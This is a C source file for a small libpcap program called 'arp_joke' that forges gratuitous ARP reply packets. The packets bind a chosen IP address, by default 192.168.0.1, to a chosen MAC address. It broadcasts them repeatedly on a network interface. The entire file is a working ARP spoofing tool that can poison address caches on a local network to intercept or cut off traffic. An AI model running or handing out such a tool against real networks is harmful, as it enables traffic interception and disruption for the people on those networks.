#include "main.h"

void arp_send(pcap_t *driver, u_char *buff, int repeat, int delay);

void usage() {
	fprintf(stdout, "arp_joke [-i device] [-e ether_dest] [-s source_ip]\n");
	fprintf(stdout, "[-r repeat] [-d delay]\n");
	exit(1);
}

int main(int argc, char **argv) {
	u_char packet[100];
	char *eth_dst = "00-02-3f-03-3f-26";
	char *sip = "192.168.0.1";
	char errbuff[PCAP_ERRBUF_SIZE];
	char *data;
	char *devn = NULL, p;
	int i = 0;
	char tmp[ETHER_ADDR_LEN];
	pcap_t *driver;
	u_char *buff;
	int repeat = 0;
	int delay = 0;
	struct ARP_HEADER *arp;
	if(getuid() != 0) {
		fprintf(stderr, "please run as root\n");
		return -1;
	}

	while((p = getopt(argc, argv, "i:e:s:r:d:")) != -1) {
		switch(p) {
		case 'i':
			devn = optarg;
			break;
		case 'e':
			eth_dst = optarg;
			break;
		case 's':
			sip = optarg;
			break;
		case 'r':
			repeat = atoi(optarg);
			break;
		case 'd':
			delay = atoi(optarg);
			break;
		default:
			return -1;
		}
	}

	if(repeat == 0 || devn == NULL)
		usage();

	if((driver = pcap_open_live(devn,65535,PCAP_OPENFLAG_PROMISCUOUS,1000,errbuff)) == NULL) {
		fprintf(stderr,"open a driver error ,reason:%s\n",errbuff);
		return -1;
	}

	buff = (u_char*)malloc(sizeof(struct ether_header) + sizeof(struct ARP_HEADER));
	struct ether_header *eh = (struct ether_header*)buff;
	//dst-host-eth-addr
	memset(tmp,0,ETHER_ADDR_LEN);
	eth_addr_parse("ff-ff-ff-ff-ff-ff",tmp);
	memcpy(&(eh->ether_dhost),tmp,ETHER_ADDR_LEN);
	//src-host-eth-addr
	memset(tmp,0,ETHER_ADDR_LEN);
	eth_addr_parse(eth_dst,tmp);
	memcpy(&(eh->ether_shost),tmp,ETHER_ADDR_LEN);
	eh->ether_type=htons(0x0806);
	arp = (struct ARP_HEADER*)(buff + sizeof(struct ether_header));
	arp->arp_hdr = htons(1);
	arp->arp_pro = htons(0x0800);
	arp->arp_hln = 0x0006;
	arp->arp_pln = 0x0004;
	arp->arp_opt = htons(0x0002);

	memset(tmp,0,ETHER_ADDR_LEN);
	eth_addr_parse(eth_dst,tmp);
	memcpy(&(arp->arp_sha),tmp,ETHER_ADDR_LEN);

	inet_aton(sip,(struct in_addr*)&(arp->arp_spa));

	memset(tmp,0,ETHER_ADDR_LEN);
	eth_addr_parse("ff-ff-ff-ff-ff-ff",tmp);
	memcpy(&(arp->arp_tha),tmp,ETHER_ADDR_LEN);

	inet_aton("0.0.0.0",(struct in_addr*)&(arp->arp_tpa));
	arp_send(driver, buff, repeat, delay);
	return 0;
}

void arp_send(pcap_t *driver, u_char *buff, int repeat, int delay) {
	int i = 0; 
	for(; i < repeat; i++) {
		if(pcap_sendpacket(driver, buff, sizeof(struct ether_header) + sizeof(struct ARP_HEADER)) != 0) {
			fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(driver));
			return;
		}
		fprintf(stdout, "send arp, times %d\n", i+1);
		if(delay)
			sleep(delay);
	}
}

